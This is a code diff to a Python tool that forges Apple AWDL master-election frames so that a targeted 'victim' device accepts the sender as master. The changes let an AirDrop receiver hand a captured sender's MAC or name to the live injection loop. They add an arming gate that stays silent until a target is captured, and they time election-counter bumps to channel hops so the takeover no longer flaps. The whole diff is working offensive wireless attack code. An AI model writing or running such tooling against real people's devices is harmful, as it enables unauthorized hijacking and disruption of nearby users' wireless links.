@@ -173,6 +173,13 @@ MASTER_COUNTER_STEP = 1
 # master) while behaving exactly like a real master -- neither frozen (looks
 # dead) nor incrementing every frame (every frame then looks like a new master
 # generation, making the victim re-elect constantly).
+#
+# When hopping across channels the bump is additionally *aligned to a channel
+# switch* (see run_injection): a counter change landing mid-visit would make the
+# last frame before a hop carry a lone, never-repeated new value, which the
+# victim reads as an unconfirmed new master generation and re-elects on -- the
+# "master briefly, then lost" flapping. Bumping only at a visit boundary gives
+# each visit one value the victim sees repeated and can confirm.
 MASTER_COUNTER_INTERVAL = 3.14    # seconds between counter increments (AWDL "PI")
 
 BROADCAST = b"\xff\xff\xff\xff\xff\xff"
@@ -690,14 +697,21 @@ class HostnameTracker:
 
     Matching is case-insensitive on the advertised hostname.  Pass the observed
     frames in via :meth:`observe` (``poll_rx`` does this during injection).
+
+    All methods are guarded by a lock, so another thread (e.g. an AirDrop
+    receiver capturing a sender's identity, see ``airdrop_target.py``) can call
+    :meth:`add_target` / :meth:`add_fixed` while the injection loop is calling
+    :meth:`observe`.
     """
 
     def __init__(self, store, fixed=(), names=()):
         self.store = store
+        self._lock = threading.Lock()
         self.fixed = [bytes(m) for m in fixed]
         self.names = [n.lower() for n in names]
         self.resolved = {}       # hostname (lower-case) -> current MAC (bytes)
-        self._apply()
+        with self._lock:
+            self._rebuild_locked()
 
     def observe(self, src, hostname):
         """Feed one observed ``(src MAC, hostname)``.
@@ -708,17 +722,54 @@ class HostnameTracker:
         if hostname is None:
             return None
         key = hostname.lower()
-        if key not in self.names:
-            return None
         src = bytes(src)
-        old = self.resolved.get(key)
-        if old == src:
-            return None
-        self.resolved[key] = src
-        self._apply()
+        with self._lock:
+            if key not in self.names:
+                return None
+            old = self.resolved.get(key)
+            if old == src:
+                return None
+            self.resolved[key] = src
+            self._rebuild_locked()
         return (hostname, old, src)
 
-    def _apply(self):
+    def add_target(self, name, mac=None):
+        """Start following AWDL ``name`` (a hostname / UUID), optionally seeding
+        its current ``mac`` (6 bytes) so injection retargets immediately, before
+        the next frame from it is observed.
+
+        This is the hook an AirDrop receiver uses to hand a captured sender's
+        identity to the live injection.  Thread-safe; returns the resolved MAC
+        (bytes) or ``None`` if only the name was added.
+        """
+        key = str(name).lower()
+        with self._lock:
+            if key not in self.names:
+                self.names.append(key)
+            if mac is not None:
+                self.resolved[key] = bytes(mac)
+            self._rebuild_locked()
+            return self.resolved.get(key)
+
+    def add_fixed(self, mac):
+        """Add a fixed target ``mac`` (6 bytes) not tied to a name -- used when a
+        captured device advertises no resolvable AWDL name, so only its current
+        MAC is known.  Thread-safe.  A later :meth:`add_target` for the same
+        device can bind its name so rotation is followed from then on.
+        """
+        mac = bytes(mac)
+        with self._lock:
+            if mac not in self.fixed:
+                self.fixed.append(mac)
+            self._rebuild_locked()
+
+    def _rebuild_locked(self):
+        """Recompute ``store['targets']`` = ``fixed + resolved``.
+
+        The caller must hold ``self._lock``.  ``ParamStore.update`` takes the
+        store's own lock, so the lock order is always tracker -> store (the
+        store never calls back into the tracker), which cannot deadlock.
+        """
         targets = list(self.fixed)
         for key in self.names:
             mac = self.resolved.get(key)
@@ -727,8 +778,9 @@ class HostnameTracker:
         self.store.update(targets=targets)
 
     def unresolved(self):
-        """Tracked hostnames that have not been seen (resolved) yet."""
-        return [n for n in self.names if n not in self.resolved]
+        """Tracked names that have not been seen (resolved) to a MAC yet."""
+        with self._lock:
+            return [n for n in self.names if n not in self.resolved]
 
 
 # ---------------------------------------------------------------------------
@@ -992,7 +1044,7 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                   channel_dwell=CHANNEL_DWELL_DEFAULT,
                   counter_step=MASTER_COUNTER_STEP,
                   counter_interval=MASTER_COUNTER_INTERVAL,
-                  stop=None, tracker=None):
+                  stop=None, tracker=None, arm=None):
     """Inject AWDL MIF frames, reading every live parameter from ``store``.
 
     This is the reusable core of the tool.  Before building each frame it pulls
@@ -1022,6 +1074,11 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
         tracker         optional :class:`HostnameTracker`; when given, received
                         frames are fed to it so it can follow MAC rotations and
                         update ``store``'s ``targets`` automatically
+        arm             optional ``threading.Event``; while given and not set,
+                        the loop stays fully dormant -- no channel tuning, no
+                        TX -- so another component (e.g. an AirDrop receiver)
+                        can let a co-resident AWDL daemon own the radio until a
+                        target has been captured, then set it to begin sending
 
     Returns the ``(sent, dropped)`` frame counts.
     """
@@ -1029,6 +1086,7 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
         stop = threading.Event()
     rotate_channels = list(rotate_channels) if rotate_channels else []
     multi = len(rotate_channels) > 1
+    pending_arm = arm is not None
 
     watch_state = {}
     last_report = time.monotonic()
@@ -1042,6 +1100,20 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
     next_counter_bump = time.monotonic() + counter_interval
 
     while not stop.is_set():
+        # Arming gate: until armed, stay dormant -- do not tune the radio or
+        # transmit -- so a co-resident AWDL daemon (owl) keeps the one radio to
+        # itself (e.g. for AirDrop discovery) until the first target is
+        # captured. On the arming edge, reset the cadence timers so we do not
+        # fire a backlog of counter bumps / channel switches at once.
+        if pending_arm:
+            if not arm.is_set():
+                if stop.wait(0.1):
+                    break
+                continue
+            pending_arm = False
+            next_switch = time.monotonic() + channel_dwell
+            next_counter_bump = time.monotonic() + counter_interval
+
         # Advance the channel rotation once the dwell on the current one is up.
         if multi and time.monotonic() >= next_switch:
             ci = (ci + 1) % len(rotate_channels)
@@ -1056,13 +1128,44 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
         # otherwise leave us injecting on the wrong channel while believing we
         # moved, so we keep the old channel and retry on the next cycle.
         desired = rotate_channels[ci] if multi else snap["channel"]
+        switched = False
         if desired != current_channel:
             if set_channel(ifname, desired, quiet=True):
                 current_channel = desired
+                switched = True
                 if multi:
                     store.update(channel=desired)
             else:
                 hop_fail += 1
+
+        # Keep the master "live" by advancing the election counter -- but do it
+        # *before* building this cycle's frames and, when hopping, only right
+        # after a channel switch, so every frame of one channel visit carries a
+        # single, stable counter value.
+        #
+        # Why the alignment matters: the victim treats a *new* counter value as
+        # a fresh master generation and only settles once it has seen that value
+        # repeated. The old code bumped on a bare wall-clock timer, uncorrelated
+        # with the ~2-3 frames sent per short visit, so a bump landing mid-visit
+        # made the *last* frame before a hop carry a lone, never-repeated new
+        # counter. The victim then re-elected itself (its self_counter ticks up)
+        # and only re-adopted us after re-hearing and confirming us -- the
+        # "becomes master briefly, then loses it for a while" flapping. Bumping
+        # only at a visit boundary gives each visit one confirmable value. The
+        # ~counter_interval cadence (a real master's rate) is preserved by only
+        # bumping on the first switch after the interval has elapsed. In
+        # single-channel mode there are no hops, so fall back to the timer (the
+        # victim sees every value repeated across many frames there anyway).
+        now = time.monotonic()
+        if multi:
+            do_bump = switched and (counter_interval <= 0 or now >= next_counter_bump)
+        else:
+            do_bump = counter_interval <= 0 or now >= next_counter_bump
+        if do_bump:
+            new_counter = store.advance_counter(counter_step, UINT32_MAX)
+            snap["master_counter"] = new_counter
+            snap["self_counter"] = new_counter
+            next_counter_bump = now + counter_interval
 
         apply_snapshot(builder, snap)
         builder.channel = current_channel
@@ -1088,13 +1191,6 @@ def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                     sent += 1
                 else:
                     dropped += 1
-
-        # keep the master "live": advance the counter on a timer (not per frame,
-        # which would make the victim re-elect on every frame) but well within
-        # the staleness window
-        if counter_interval <= 0 or time.monotonic() >= next_counter_bump:
-            store.advance_counter(counter_step, UINT32_MAX)
-            next_counter_bump = time.monotonic() + counter_interval
 
         if watch or tracker is not None:
             changes = poll_rx(sock, snap["source"],
@@ -1196,8 +1292,11 @@ def main(argv=None):
                         default=MASTER_COUNTER_INTERVAL, metavar="TIME",
                         help="how often the election counter is advanced "
                              "(s/ms/us/tu suffix; default 3.14s = the rate a real "
-                             "AWDL master uses). Advancing per frame makes the "
-                             "victim re-elect on every frame; 0 = every frame")
+                             "AWDL master uses). When hopping (--channels) the "
+                             "bump is snapped to a channel switch so each visit "
+                             "carries one stable value the victim can confirm; "
+                             "0 = bump every switch (every frame in single-channel "
+                             "mode)")
     parser.add_argument("--awdl-version", type=parse_awdl_version,
                         default=AWDL_VERSION_TLV_DEFAULT, metavar="VER",
                         help="AWDL version advertised in the Version TLV, e.g. "
